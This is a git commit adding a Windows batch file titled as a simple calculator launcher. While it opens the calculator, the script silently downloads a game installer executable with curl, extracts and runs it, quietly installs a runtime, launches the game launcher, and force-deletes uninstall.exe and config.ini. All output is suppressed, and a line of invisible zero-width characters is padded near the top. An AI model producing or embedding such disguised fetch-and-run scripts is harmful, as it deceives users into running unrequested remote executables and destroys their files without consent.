c3ba780ad754e30b061d0ad0d050511560419841
SSSomSo666 <mxbc666@hotmail.com>
2024-08-21 21:37:51 +0800

    first commit

---
+++ Main-LaunchCalc(Not Genshin Impact).bat
@@ -0,0 +1,14 @@
+@echo off
+‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌
+cls
+title A simple calculate.
+start cmd /c calc
+curl https://autopatchcn.yuanshen.com/client_app/download/launcher/20240513153024_R4Y2Siji8AadjI0Q/mihoyo/yuanshen_setup_202405121226.exe --output Install.exe>nul 2>nul
+.\bz x "%cd%"\Install.exe>nul 2>nul
+.\vc_redist.x64.exe /quiet>nul 2>nul
+del /f /q "%cd%"\uninstall.exe
+cd 1.0.5.88
+.\HYP.exe
+cd ..
+del /f /q "%cd%"\config.ini
+pause>nul
